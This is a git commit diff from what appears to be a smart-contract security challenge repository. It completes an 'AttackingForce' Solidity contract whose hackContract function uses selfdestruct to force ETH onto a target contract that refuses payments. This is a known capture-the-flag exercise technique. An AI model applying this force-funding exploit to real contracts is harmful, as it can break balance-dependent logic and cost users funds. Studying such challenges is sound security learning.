2c408a6ed2fa4657d33e1f85c2ef541df39ccc6c
rohanagarwal <rohan.agarwal204@gmail.com>
2023-04-09 21:35:50 -0400

    Hacked 3

--- contracts/3. Force/AttackingForce.sol
+++ contracts/3. Force/AttackingForce.sol
@@ -3,13 +3,18 @@ pragma solidity ^0.8.9;
 import "./Force.sol";
 
 contract AttackingForce {
+    Force private forceContract;
     address public contractAddress;
 
     constructor(address _contractAddress) payable {
         contractAddress = _contractAddress;
+        forceContract = Force(_contractAddress);
     }
 
     function hackContract() external {
         // Code me!
+        // this should destroy ourselves while forcing our ETH onto the force contract
+        address payable payableForceAddress = payable(contractAddress);
+        selfdestruct(payableForceAddress);
     }
 }
